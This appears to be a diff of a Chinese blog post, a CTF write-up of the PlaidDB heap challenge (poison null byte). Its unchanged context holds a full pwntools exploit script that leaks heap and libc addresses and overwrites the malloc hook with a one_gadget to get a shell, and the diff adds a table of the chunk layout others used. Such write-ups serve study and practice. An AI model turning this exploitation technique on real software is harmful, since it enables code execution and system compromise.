@@ -75,7 +75,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258784894.png">
 <meta property="og:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581260525230.png">
 <meta property="article:published_time" content="2020-02-10T14:54:41.000Z">
-<meta property="article:modified_time" content="2020-02-11T00:13:57.287Z">
+<meta property="article:modified_time" content="2020-02-11T00:44:13.029Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064511575.png">
@@ -215,7 +215,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-02-10 06:54:41 / Modified: 16:13:57" itemprop="dateCreated datePublished" datetime="2020-02-10T06:54:41-08:00">2020-02-10</time>
+              <time title="Created: 2020-02-10 06:54:41 / Modified: 16:44:13" itemprop="dateCreated datePublished" datetime="2020-02-10T06:54:41-08:00">2020-02-10</time>
             </span>
 
           
@@ -1282,7 +1282,56 @@
 <p>不过在PUT里面的malloc触发one_gadget死活不成功，本来以为又要嗝屁了55555，结果在我坚持尝试的努力下，在DEL中成功将one_gadget触发成功</p>
 <h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'PlaidDB'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"GET"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"PUT"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter data size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter data:"</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"DUMP"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Enter command:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">"DEL"</span>)</span><br><span class="line">	p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">	p.sendline(key)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">"th3fl4g"</span>, <span class="number">0x88</span>, <span class="string">'\x00'</span>*<span class="number">0x88</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x38</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x68</span>)</span><br><span class="line">PUT(<span class="string">"3333333"</span>, <span class="number">0x38</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span>)</span><br><span class="line">PUT(<span class="string">"2222222"</span>, <span class="number">0x58</span>, <span class="string">'\x00'</span>*<span class="number">0x58</span>)</span><br><span class="line">PUT(<span class="string">'4444444'</span>, <span class="number">0x58</span>, <span class="string">'\x00'</span>*<span class="number">0x58</span>)</span><br><span class="line">PUT(<span class="string">'4444444'</span>, <span class="number">0xf8</span>, <span class="string">'\x00'</span>*<span class="number">0xf8</span>)</span><br><span class="line">PUT(<span class="string">'5'</span>*<span class="number">0x10</span>+p64(<span class="number">0x300</span>), <span class="number">0x108</span>, <span class="string">'\x00'</span>*<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">'2222222'</span>)</span><br><span class="line">DEL(<span class="string">'th3fl4g'</span>)</span><br><span class="line">DEL(<span class="string">'4444444'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'brva 0x1334'</span>)</span><br><span class="line">PUT(<span class="string">'a'</span>, <span class="number">0xc8</span>, <span class="string">'\x00'</span>*<span class="number">0xc8</span>)<span class="comment">#D0 chunk</span></span><br><span class="line"></span><br><span class="line">DUMP()</span><br><span class="line"><span class="comment">#p.recvuntil('bytes')</span></span><br><span class="line">p.recvuntil(<span class="string">'['</span>)</span><br><span class="line">heap_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x610</span></span><br><span class="line">p.recvuntil(<span class="string">', '</span>)</span><br><span class="line">libc_base=int(p.recvuntil(<span class="string">' '</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + hex(heap_base)+<span class="string">','</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">fill1=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x180</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x390</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4aed</span>)+p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">PUT(<span class="string">'b'</span>,<span class="number">0xa8</span>,fill1)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">'c'</span>,<span class="number">0x68</span>,<span class="string">'no mean'</span>.ljust(<span class="number">0x48</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0x200</span>)+p64(libc_base+<span class="number">0x3c4b78</span>)*<span class="number">2</span>+<span class="string">'\x00'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">'b'</span>)</span><br><span class="line"><span class="comment">### Write different one_gadget</span></span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0x45216)+'\x00'*77)</span></span><br><span class="line">PUT(<span class="string">'gogogo'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">19</span>+p64(libc_base+<span class="number">0x4526a</span>)+<span class="string">'\x00'</span>*<span class="number">77</span>)</span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0xf02a4)+'\x00'*77)</span></span><br><span class="line"><span class="comment">#PUT('never',0x68,'\x00'*19+p64(libc_base+0xf1147)+'\x00'*77)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># try try try</span></span><br><span class="line">DEL(<span class="string">'gogogo'</span>)</span><br><span class="line"><span class="comment">#GET('')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这个堆题应该是目前为止写的时间最长，也是最麻烦的一个堆题，主要是树形结构的逆向很耗时间，然后再off_by_one的构造上也要花不少功夫，合并的内存块前面必须要满足unlink条件，这个就需要精力去考虑一下在这种复杂堆管理下的构造方式，再就是一定要清楚各个模块对chunk操作的顺序，否贼写起来真的毫无头绪。再就是这个leak的方式也是我第一次见，通过unsortedbin指针，既打印了libc的地址又打印了堆的地址，承认这个操作是看师傅们的wp来的，以后一定在leak方面加把劲XD。最后就是玄学树操作，比赛碰到这种一定要不求甚解，只要能不影响漏洞利用就可以了，要不然浪费大量时间。</p>
+<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这个堆题应该是目前为止写的时间最长，也是最麻烦的一个堆题，主要是树形结构的逆向很耗时间，然后再off_by_one的构造上也要花不少功夫，合并的内存块前面必须要满足unlink条件，这个就需要精力去考虑一下在这种复杂堆管理下的构造方式，再就是一定要清楚各个模块对chunk操作的顺序，否贼写起来真的毫无头绪。再就是这个leak的方式也是我第一次见，通过unsortedbin指针，既打印了libc的地址又打印了堆的地址，承认这个操作是看师傅们的wp来的，以后一定在leak方面加把劲XD。最后就是玄学树操作，比赛碰到这种一定要不求甚解，只要能不影响漏洞利用就可以了，要不然浪费大量时间。<br>另外这题师傅们的构造更好一点，师傅们的构造是这样的，0x90加到0x100 chunk之前刚好是0x200的一个chunk</p>
+<table>
+<thead>
+<tr>
+<th>node A</th>
+<th>dataB</th>
+<th>rkB</th>
+<th>rkA</th>
+<th>dataA</th>
+<th>nodeB</th>
+<th>nodeC</th>
+<th>rkC</th>
+<th></th>
+<th>nodeD</th>
+<th>rkd(exp)</th>
+<th>dataC_n</th>
+<th>dataD</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x40</td>
+<td>0x20</td>
+<td>0x20</td>
+<td>0x20</td>
+<td>0x90</td>
+<td>0x40</td>
+<td>0x40</td>
+<td>0x20</td>
+<td>0x70</td>
+<td>0x40</td>
+<td>0x20</td>
+<td>0x100</td>
+<td>0x20</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>fastbin1</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
 <p><strong>最后：多撸源码</strong></p>
 
     </div>
